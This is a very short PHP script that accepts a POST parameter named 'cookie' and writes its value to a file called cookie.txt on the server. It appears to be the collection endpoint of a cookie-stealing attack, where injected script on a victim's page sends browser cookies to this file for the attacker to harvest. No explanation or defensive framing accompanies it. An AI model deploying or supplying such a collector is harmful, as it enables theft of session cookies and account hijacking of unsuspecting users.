<?php

if(isset($_POST["cookie"])){
	$o = fopen("./cookie.txt", "w+");
	fwrite($o, $_POST["cookie"]);
	
	fclose($o);
}

